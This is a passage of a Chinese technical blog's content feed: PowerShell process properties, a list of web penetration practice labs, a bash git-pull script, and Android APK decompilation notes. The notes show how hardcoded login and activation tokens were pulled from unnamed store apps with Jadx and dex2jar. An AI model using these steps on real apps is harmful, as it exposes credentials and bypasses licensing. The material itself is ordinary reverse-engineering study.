="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>VirtualMemorySize64    <span class="token function">Write-Host</span> <span class="token string">"WorkingSet ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>WorkingSet    <span class="token function">Write-Host</span> <span class="token string">"WorkingSet64 ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>WorkingSet64    <span class="token function">Write-Host</span> <span class="token string">"Company ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Company    <span class="token function">Write-Host</span> <span class="token string">"CPU ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>CPU    <span class="token function">Write-Host</span> <span class="token string">"Description ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Description    <span class="token function">Write-Host</span> <span class="token string">"FileVersion ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>FileVersion    <span class="token function">Write-Host</span> <span class="token string">"Product ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Product    <span class="token function">Write-Host</span> <span class="token string">"ProductVersion ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>ProductVersion    <span class="token comment" spellcheck="true"># Write-Host "PSConfiguration =" $process.PSConfiguration</span>    <span class="token comment" spellcheck="true"># Write-Host "PSResources =" $process.PSResources</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># 通过 Get-Member 命令可以获得 process 对象的所有属性</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#    TypeName: System.Diagnostics.Process</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># Name                       MemberType     Definition</span><span class="token comment" spellcheck="true"># ----                       ----------     ----------</span><span class="token comment" spellcheck="true"># Handles                    AliasProperty  Handles = Handlecount</span><span class="token comment" spellcheck="true"># Name                       AliasProperty  Name = ProcessName</span><span class="token comment" spellcheck="true"># NPM                        AliasProperty  NPM = NonpagedSystemMemorySize</span><span class="token comment" spellcheck="true"># PM                         AliasProperty  PM = PagedMemorySize</span><span class="token comment" spellcheck="true"># VM                         AliasProperty  VM = VirtualMemorySize</span><span class="token comment" spellcheck="true"># WS                         AliasProperty  WS = WorkingSet</span><span class="token comment" spellcheck="true"># Disposed                   Event          System.EventHandler Disposed(System.Object, System.EventArgs)</span><span class="token comment" spellcheck="true"># ErrorDataReceived          Event          System.Diagnostics.DataReceivedEventHandler ErrorDataReceived(System.Objec...</span><span class="token comment" spellcheck="true"># Exited                     Event          System.EventHandler Exited(System.Object, System.EventArgs)</span><span class="token comment" spellcheck="true"># OutputDataReceived         Event          System.Diagnostics.DataReceivedEventHandler OutputDataReceived(System.Obje...</span><span class="token comment" spellcheck="true"># BeginErrorReadLine         Method         void BeginErrorReadLine()</span><span class="token comment" spellcheck="true"># BeginOutputReadLine        Method         void BeginOutputReadLine()</span><span class="token comment" spellcheck="true"># CancelErrorRead            Method         void CancelErrorRead()</span><span class="token comment" spellcheck="true"># CancelOutputRead           Method         void CancelOutputRead()</span><span class="token comment" spellcheck="true"># Close                      Method         void Close()</span><span class="token comment" spellcheck="true"># CloseMainWindow            Method         bool CloseMainWindow()</span><span class="token comment" spellcheck="true"># CreateObjRef               Method         System.Runtime.Remoting.ObjRef CreateObjRef(type requestedType)</span><span class="token comment" spellcheck="true"># Dispose                    Method         void Dispose(), void IDisposable.Dispose()</span><span class="token comment" spellcheck="true"># Equals                     Method         bool Equals(System.Object obj)</span><span class="token comment" spellcheck="true"># GetHashCode                Method         int GetHashCode()</span><span class="token comment" spellcheck="true"># GetLifetimeService         Method         System.Object GetLifetimeService()</span><span class="token comment" spellcheck="true"># GetType                    Method         type GetType()</span><span class="token comment" spellcheck="true"># InitializeLifetimeService  Method         System.Object InitializeLifetimeService()</span><span class="token comment" spellcheck="true"># Kill                       Method         void Kill()</span><span class="token comment" spellcheck="true"># Refresh                    Method         void Refresh()</span><span class="token comment" spellcheck="true"># Start                      Method         bool Start()</span><span class="token comment" spellcheck="true"># ToString                   Method         string ToString()</span><span class="token comment" spellcheck="true"># WaitForExit                Method         bool WaitForExit(int milliseconds), void WaitForExit()</span><span class="token comment" spellcheck="true"># WaitForInputIdle           Method         bool WaitForInputIdle(int milliseconds), bool WaitForInputIdle()</span><span class="token comment" spellcheck="true"># __NounName                 NoteProperty   System.String __NounName=Process</span><span class="token comment" spellcheck="true"># BasePriority               Property       int BasePriority {get;}</span><span class="token comment" spellcheck="true"># Container                  Property       System.ComponentModel.IContainer Container {get;}</span><span class="token comment" spellcheck="true"># EnableRaisingEvents        Property       bool EnableRaisingEvents {get;set;}</span><span class="token comment" spellcheck="true"># ExitCode                   Property       int ExitCode {get;}</span><span class="token comment" spellcheck="true"># ExitTime                   Property       datetime ExitTime {get;}</span><span class="token comment" spellcheck="true"># Handle                     Property       System.IntPtr Handle {get;}</span><span class="token comment" spellcheck="true"># HandleCount                Property       int HandleCount {get;}</span><span class="token comment" spellcheck="true"># HasExited                  Property       bool HasExited {get;}</span><span class="token comment" spellcheck="true"># Id                         Property       int Id {get;}</span><span class="token comment" spellcheck="true"># MachineName                Property       string MachineName {get;}</span><span class="token comment" spellcheck="true"># MainModule                 Property       System.Diagnostics.ProcessModule MainModule {get;}</span><span class="token comment" spellcheck="true"># MainWindowHandle           Property       System.IntPtr MainWindowHandle {get;}</span><span class="token comment" spellcheck="true"># MainWindowTitle            Property       string MainWindowTitle {get;}</span><span class="token comment" spellcheck="true"># MaxWorkingSet              Property       System.IntPtr MaxWorkingSet {get;set;}</span><span class="token comment" spellcheck="true"># MinWorkingSet              Property       System.IntPtr MinWorkingSet {get;set;}</span><span class="token comment" spellcheck="true"># Modules                    Property       System.Diagnostics.ProcessModuleCollection Modules {get;}</span><span class="token comment" spellcheck="true"># NonpagedSystemMemorySize   Property       int NonpagedSystemMemorySize {get;}</span><span class="token comment" spellcheck="true"># NonpagedSystemMemorySize64 Property       long NonpagedSystemMemorySize64 {get;}</span><span class="token comment" spellcheck="true"># PagedMemorySize            Property       int PagedMemorySize {get;}</span><span class="token comment" spellcheck="true"># PagedMemorySize64          Property       long PagedMemorySize64 {get;}</span><span class="token comment" spellcheck="true"># PagedSystemMemorySize      Property       int PagedSystemMemorySize {get;}</span><span class="token comment" spellcheck="true"># PagedSystemMemorySize64    Property       long PagedSystemMemorySize64 {get;}</span><span class="token comment" spellcheck="true"># PeakPagedMemorySize        Property       int PeakPagedMemorySize {get;}</span><span class="token comment" spellcheck="true"># PeakPagedMemorySize64      Property       long PeakPagedMemorySize64 {get;}</span><span class="token comment" spellcheck="true"># PeakVirtualMemorySize      Property       int PeakVirtualMemorySize {get;}</span><span class="token comment" spellcheck="true"># PeakVirtualMemorySize64    Property       long PeakVirtualMemorySize64 {get;}</span><span class="token comment" spellcheck="true"># PeakWorkingSet             Property       int PeakWorkingSet {get;}</span><span class="token comment" spellcheck="true"># PeakWorkingSet64           Property       long PeakWorkingSet64 {get;}</span><span class="token comment" spellcheck="true"># PriorityBoostEnabled       Property       bool PriorityBoostEnabled {get;set;}</span><span class="token comment" spellcheck="true"># PriorityClass              Property       System.Diagnostics.ProcessPriorityClass PriorityClass {get;set;}</span><span class="token comment" spellcheck="true"># PrivateMemorySize          Property       int PrivateMemorySize {get;}</span><span class="token comment" spellcheck="true"># PrivateMemorySize64        Property       long PrivateMemorySize64 {get;}</span><span class="token comment" spellcheck="true"># PrivilegedProcessorTime    Property       timespan PrivilegedProcessorTime {get;}</span><span class="token comment" spellcheck="true"># ProcessName                Property       string ProcessName {get;}</span><span class="token comment" spellcheck="true"># ProcessorAffinity          Property       System.IntPtr ProcessorAffinity {get;set;}</span><span class="token comment" spellcheck="true"># Responding                 Property       bool Responding {get;}</span><span class="token comment" spellcheck="true"># SessionId                  Property       int SessionId {get;}</span><span class="token comment" spellcheck="true"># Site                       Property       System.ComponentModel.ISite Site {get;set;}</span><span class="token comment" spellcheck="true"># StandardError              Property       System.IO.StreamReader StandardError {get;}</span><span class="token comment" spellcheck="true"># StandardInput              Property       System.IO.StreamWriter StandardInput {get;}</span><span class="token comment" spellcheck="true"># StandardOutput             Property       System.IO.StreamReader StandardOutput {get;}</span><span class="token comment" spellcheck="true"># StartInfo                  Property       System.Diagnostics.ProcessStartInfo StartInfo {get;set;}</span><span class="token comment" spellcheck="true"># StartTime                  Property       datetime StartTime {get;}</span><span class="token comment" spellcheck="true"># SynchronizingObject        Property       System.ComponentModel.ISynchronizeInvoke SynchronizingObject {get;set;}</span><span class="token comment" spellcheck="true"># Threads                    Property       System.Diagnostics.ProcessThreadCollection Threads {get;}</span><span class="token comment" spellcheck="true"># TotalProcessorTime         Property       timespan TotalProcessorTime {get;}</span><span class="token comment" spellcheck="true"># UserProcessorTime          Property       timespan UserProcessorTime {get;}</span><span class="token comment" spellcheck="true"># VirtualMemorySize          Property       int VirtualMemorySize {get;}</span><span class="token comment" spellcheck="true"># VirtualMemorySize64        Property       long VirtualMemorySize64 {get;}</span><span class="token comment" spellcheck="true"># WorkingSet                 Property       int WorkingSet {get;}</span><span class="token comment" spellcheck="true"># WorkingSet64               Property       long WorkingSet64 {get;}</span><span class="token comment" spellcheck="true"># PSConfiguration            PropertySet    PSConfiguration {Name, Id, PriorityClass, FileVersion}</span><span class="token comment" spellcheck="true"># PSResources                PropertySet    PSResources {Name, Id, Handlecount, WorkingSet, NonPagedMemorySize, PagedM...</span><span class="token comment" spellcheck="true"># Company                    ScriptProperty System.Object Company {get=$this.Mainmodule.FileVersionInfo.CompanyName;}</span><span class="token comment" spellcheck="true"># CPU                        ScriptProperty System.Object CPU {get=$this.TotalProcessorTime.TotalSeconds;}</span><span class="token comment" spellcheck="true"># Description                ScriptProperty System.Object Description {get=$this.Mainmodule.FileVersionInfo.FileDescri...</span><span class="token comment" spellcheck="true"># FileVersion                ScriptProperty System.Object FileVersion {get=$this.Mainmodule.FileVersionInfo.FileVersion;}</span><span class="token comment" spellcheck="true"># Path                       ScriptProperty System.Object Path {get=$this.Mainmodule.FileName;}</span><span class="token comment" spellcheck="true"># Product                    ScriptProperty System.Object Product {get=$this.Mainmodule.FileVersionInfo.ProductName;}</span><span class="token comment" spellcheck="true"># ProductVersion             ScriptProperty System.Object ProductVersion {get=$this.Mainmodule.FileVersionInfo.Product...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 开发/语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> PowserShell </tag>
            
            <tag> 进程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POJ 解题报告</title>
      <link href="/algorithm/poj-solving-reports/"/>
      <url>/algorithm/poj-solving-reports/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/lyy289065406/POJ-Solving-Reports/">正在重定向到内容页面 ……</a></p></blockquote><p><a href="https://github.com/lyy289065406/POJ-Solving-Reports/">如果您的浏览器没有自动跳转， 请点击这里</a></p>    <!-- 自动跳转 -->    <meta http-equiv="refresh" content="0; url=https://github.com/lyy289065406/POJ-Solving-Reports/"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> POJ </tag>
            
            <tag> 解题报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android APP 反编译入门学习笔记</title>
      <link href="/re/androidapp-fan-bian-yi-ru-men-xue-xi-bi-ji/"/>
      <url>/re/androidapp-fan-bian-yi-ru-men-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><table><thead><tr><th align="left">内容</th><th align="left">资料/链接</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">ApkTool + dex2jar + JD-GUI</td><td align="left">《<a href="https://www.devio.org/2018/05/08/Android-reverse-engineering-for-mac/">(Mac)反编译Android APK详细操作指南</a>》</td><td align="left">Apk 反编译工具（入门级，较繁琐）</td></tr><tr><td align="left">Jadx</td><td align="left"><a href="https://github.com/skylot/jadx">Github</a> 源码</td><td align="left">Apk 反编译工具（推荐）</td></tr><tr><td align="left">脱壳原理介绍</td><td align="left">《<a href="https://www.bigfog.info/2018/04/15/Apk%E8%84%B1%E5%A3%B3%E7%AE%80%E4%BB%8B/">APK脱壳简介</a>》</td><td align="left">调试 → 找到入口点 → 脱壳 → 修复</td></tr><tr><td align="left">ApkScan</td><td align="left">《<a href="https://xz.aliyun.com/t/2095">APK查壳工具PKID</a>》</td><td align="left">查壳工具</td></tr></tbody></table><blockquote><p>【加壳】 也称 “加固”， 是指在一个主程序的外面再包裹上另一段代码，用于保护里面的主程序不不被非法修改或反编译。它们一般都是先于主程序运行、拿到控制权，然后完成它们保护主程序的任务。</p></blockquote><p><img src="00.jpg"></p><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><h3 id="练习-1-（无壳-已完成）"><a href="#练习-1-（无壳-已完成）" class="headerlink" title="练习 1 （无壳 - 已完成）"></a>练习 1 （无壳 - 已完成）</h3><table><thead><tr><th align="center">条项</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">APK</td><td align="left">3.6.4-xxx-store.apk</td></tr><tr><td align="center">目标</td><td align="left">找到登录 Token</td></tr><tr><td align="center">工具</td><td align="left">ApkTool + dex2jar + JD-GUI</td></tr></tbody></table><p>对 APK 解包 <code>unzip 3.6.4-xxx-store.apk</code> 得到 12 个 classesN.dex 文件：</p><p><img src="01.jpg"></p><p>使用 d2j-dex2jar 工具把这 12 个 dex 文件转换成 jar 包 <code>./d2j-dex2jar.sh *.dex</code>：</p><p><img src="02.jpg"></p><p>使用 JD-GUI 反编译这些 jar 包，找到 Token 在 classes9-dex2jar.jar 里面的 <code>com.xxx.store.BuildConfig.class</code> ：</p><p><img src="03.jpg"></p><h3 id="练习-2-（无壳-已完成）"><a href="#练习-2-（无壳-已完成）" class="headerlink" title="练习 2 （无壳 - 已完成）"></a>练习 2 （无壳 - 已完成）</h3><table><thead><tr><th align="center">条项</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">APK</td><td align="left">xxx.go.v4.v4.1.2.apk</td></tr><tr><td align="center">目标</td><td align="left">找到激活 Token</td></tr><tr><td align="center">工具</td><td align="left">Jadx</td></tr></tbody></table><p>直接使用 Jadx 打开 3.6.4-xxx-store.apk 即可实现反编译。</p><p>在 <code>xxx.pilot.active.xxxActiveController.class</code> 和 <code>xxx.pilot.active.b.class</code> 可以找到特征非常明显的激活 Token ，激活逻辑在 <code>xxx.pilot.active.b.class</code> 下面，对该 Token 实现了调用。</p><p><img src="04.jpg"></p><p><img src="05.jpg"></p><p><img src="06.jpg"></p><h3 id="练习-3-（有壳-未完成）"><a href="#练习-3-（有壳-未完成）" class="headerlink" title="练习 3 （有壳 - 未完成）"></a>练习 3 （有壳 - 未完成）</h3><table><thead><tr><th align="center">条项</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">APK</td><td align="left">3.6.4-xxx-store-梆梆加固.apk</td></tr><tr><td align="center">目标</td><td align="left">找到登录 Token</td></tr><tr><td align="center">工具</td><td align="left">ApkScan + Jadx</td></tr></tbody></table><p>使用 ApkScan 查壳，发现 APK 使用了【梆梆企业版】进行加固：</p><p><img src="07.jpg"></p><blockquote><p>未完待续……</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> 逆向 </tag>
            
            <tag> 反编译 </tag>
            
            <tag> 壳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB 渗透靶场整合</title>
      <link href="/safe/web-shen-tou-ba-chang-zheng-he/"/>
      <url>/safe/web-shen-tou-ba-chang-zheng-he/</url>
      
        <content type="html"><![CDATA[<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p>推荐新手首选靶场，配置简单，需下载 phpstudy 和靶场文件包，简单部署之后即可访问。</p><p>包含了常见的web漏洞（php的），每个漏洞分为四个等级，每个等级都有源码查看，最高等级的源码是最安全的。</p><ul><li>DVWA靶场源码下载：<a href="http://www.dvwa.co.uk/index.php">http://www.dvwa.co.uk/index.php</a></li><li>phpstudy官方下载：<a href="https://m.xp.cn/">https://m.xp.cn/</a></li></ul><h2 id="网络安全实验室"><a href="#网络安全实验室" class="headerlink" title="网络安全实验室"></a>网络安全实验室</h2><p>做题的靶场，也是一个基础靶场，是一个在线的靶场。</p><ul><li>地址：<a href="http://hackinglab.cn/">http://hackinglab.cn/</a></li></ul><h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><p>sqli-labs 包含了大多数的 sql 注入类型，以一种闯关模式，对于 sql 注入进行漏洞利用。</p><p>sql 注入练习首选，同样需要 phpstudy （或者 amp 环境）加靶场源码包部署。</p><ul><li>sqli-labs 靶场源码下载：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></li></ul><h2 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h2><p>upload-labs 包含了大多数文件上传类型，一个包含几乎所有类型上传漏洞的靶场。</p><p>目前更新到 20 关。</p><ul><li>靶场源码下载地址：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></li></ul><h2 id="xss-challenges"><a href="#xss-challenges" class="headerlink" title="xss challenges"></a>xss challenges</h2><p>xsschallenges 是一个专对于 XSS 漏洞练习的的靶场，包含了各种绕过，各种姿势的 XSS 利用。</p><ul><li>在线靶场地址：<a href="http://xss-quiz.int21h.jp/">http://xss-quiz.int21h.jp/</a></li></ul><h2 id="必火网络安全-必火靶机三"><a href="#必火网络安全-必火靶机三" class="headerlink" title="必火网络安全-必火靶机三"></a>必火网络安全-必火靶机三</h2><p>这个在线靶场涵盖了大多数的 Web 漏洞，跟 DVWA 的机制差不多，还有 CTF 题可做，个人认为是一个比较全的一个 Web 漏洞靶场。</p><ul><li>在线靶场地址：<a href="https://www.bihuoedu.com/">https://www.bihuoedu.com/</a></li></ul><h2 id="OWASP-Broken-Web-Applications-Project"><a href="#OWASP-Broken-Web-Applications-Project" class="headerlink" title="OWASP Broken Web Applications Project"></a>OWASP Broken Web Applications Project</h2><p>靶场由 OWASP 专门为 Web 安全研究者和初学者开发的一个靶场，包含了大量存在已知安全漏洞的训练实验环境和真实 Web 应用程序。</p><p>靶场在官网下载后是一个集成虚拟机，可以直接在 vm 中打开，物理机访问 ip 即可访问到 web 平台，使用 root/owaspbwa 登入就会返回靶场地址，直接可以访问靶场。</p><p>DVWA 适合了解漏洞和简单的漏洞利用，owaspbwa 则就更贴近实际的复杂的业务环境。</p><ul><li>靶场虚拟机下载地址：<a href="https://sourceforge.net/projects/owaspbwa/">https://sourceforge.net/projects/owaspbwa/</a></li></ul><h2 id="VulHub"><a href="#VulHub" class="headerlink" title="VulHub"></a>VulHub</h2><p>这是一个开源的漏洞环境项目，包含了很多不同的环境，是继 owaspbwa 以后，漏洞种类多，环境丰富的一个靶场，并且收集的漏洞也比较新，适合作为一个长期的学习、实战靶场。</p><p>Vulhub 是一个基于 docker 和 docker-compose 的漏洞环境集合，需要在 linux 下安装 docker，有 docker 环境之后，即可一条语句启动一个漏洞环境。</p><ul><li>vulhub 指导安装地址：<a href="https://vulhub.org/">https://vulhub.org/</a></li></ul><h2 id="vulnhub"><a href="#vulnhub" class="headerlink" title="vulnhub"></a>vulnhub</h2><p>Vulnhub 是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用 VMware 或者 VirtualBox 运行。</p><p>每个镜像会有破解的目标，大多是 Boot2root，从启动虚机到获取操作系统的 root 权限和查看 flag。</p><p>相比于 vulhub，这是采用的虚拟机镜像，前者是采用 docker。</p><ul><li>靶场地址：<a href="https://www.vulnhub.com/">https://www.vulnhub.com</a></li></ul><h2 id="webug4-0"><a href="#webug4-0" class="headerlink" title="webug4.0"></a>webug4.0</h2><p>基础环境是基于 PHP/mysql 制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。</p><p>部分漏洞是基于 Windows 操作系统的漏洞所以将 WeBug 的 Web 环境都装在了一个纯净版的 Windows 虚拟机中。</p><ul><li>虚拟机下载地址：<a href="https://pan.baidu.com/s/128ftyRIdCibJu6FJfEKltg">https://pan.baidu.com/s/128ftyRIdCibJu6FJfEKltg</a></li><li>提取码: 5er7</li></ul><h2 id="vulnstack"><a href="#vulnstack" class="headerlink" title="vulnstack"></a>vulnstack</h2><p>红蓝对抗，内网、域渗透最新靶场：</p><ul><li>地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/">http://vulnstack.qiyuanxuetang.net/vuln/</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 解题报告</title>
      <link href="/safe/ctf-solving-reports/"/>
      <url>/safe/ctf-solving-reports/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/lyy289065406/CTF-Solving-Reports/">正在重定向到内容页面 ……</a></p></blockquote><p><a href="https://github.com/lyy289065406/CTF-Solving-Reports/">如果您的浏览器没有自动跳转， 请点击这里</a></p>    <!-- 自动跳转 -->    <meta http-equiv="refresh" content="0; url=https://github.com/lyy289065406/CTF-Solving-Reports/"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题报告 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从 Git 仓库拉取代码到本地</title>
      <link href="/lang/pullgitrepos/"/>
      <url>/lang/pullgitrepos/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment" spellcheck="true"># 从 Git 仓库拉取代码到本地</span><span class="token comment" spellcheck="true">#-------------------------------------------------</span><span class="token comment" spellcheck="true"># 命令执行示例：</span><span class="token comment" spellcheck="true"># ./pull_git_repository.sh -u USERNAME -p PASSWORD</span><span class="token comment" spellcheck="true">#-------------------------------------------------</span><span class="token comment" spellcheck="true"># 命令参数定义</span>DOMAIN<span class="token operator">=</span><span class="token string">"www.xyz.com/repository"</span>GITURL<span class="token operator">=</span><span class="token string">"https://<span class="token variable">${DOMAIN}</span>"</span>               <span class="token comment" spellcheck="true"># -a: Git 仓库地址</span>GITBRANCH<span class="token operator">=</span><span class="token string">"master"</span>                       <span class="token comment" spellcheck="true"># -b: Git 仓库分支名称</span>GITUSER<span class="token operator">=</span><span class="token string">"user@abc.com"</span>                   <span class="token comment" spellcheck="true"># -u: Git 仓库账号</span>GITPASS<span class="token operator">=</span><span class="token string">"123456"</span>                         <span class="token comment" spellcheck="true"># -p: Git 仓库密码</span>GITTAG<span class="token operator">=</span><span class="token string">"latest"</span>                          <span class="token comment" spellcheck="true"># -v: 要使用的 Git 的 tag 基线版本名称 (若使用分支的最新版本，保持为默认值即可)</span>TARGET<span class="token operator">=</span><span class="token string">"/tmp/repository"</span>                 <span class="token comment" spellcheck="true"># -t: 拉取仓库到本地的存储位置(若该位置已存在 Git 则自动拉取最新代码，此时忽略其他参数)</span><span class="token comment" spellcheck="true"># 使用说明</span>usage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">cat</span> <span class="token operator">&lt;&lt;</span><span class="token string">EOF    -h            This help message.    -a &lt;url>      Git Repository URL. (Default: "<span class="token variable">${GITURL}</span>")    -b &lt;branch>   Git Repository Branch. (Default: "<span class="token variable">${GITBRANCH}</span>")    -u &lt;username> Git Repository Username. (Default: "<span class="token variable">${GITUSER}</span>")    -p &lt;password> Git Repository Password. (Default: "<span class="token variable">${GITPASS}</span>")    -v &lt;tag>      Git Repository Tag Version. (Default: "<span class="token variable">${GITTAG}</span>")    -t &lt;path>     Save Git Repository Directory. (Default: "<span class="token variable">${TARGET}</span>")EOF</span>  <span class="token keyword">exit</span> 0<span class="token punctuation">}</span><span class="token comment" spellcheck="true"># [ "$1" = "" ] &amp;&amp; usage</span><span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">=</span> <span class="token string">"-h"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> usage<span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">=</span> <span class="token string">"-H"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> usage<span class="token comment" spellcheck="true"># 定义参数键和值</span><span class="token keyword">set</span> -- `getopt a:b:u:p:v:t: <span class="token string">"<span class="token variable">$@</span>"</span>`<span class="token keyword">while</span> <span class="token punctuation">[</span> -n <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token punctuation">]</span><span class="token keyword">do</span>  <span class="token keyword">case</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token keyword">in</span>    -a<span class="token punctuation">)</span> GITURL<span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span>        <span class="token function">shift</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>    -b<span class="token punctuation">)</span> GITBRANCH<span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span>        <span class="token function">shift</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>    -u<span class="token punctuation">)</span> GITUSER<span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span>        <span class="token function">shift</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>    -p<span class="token punctuation">)</span> GITPASS<span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span>        <span class="token function">shift</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>    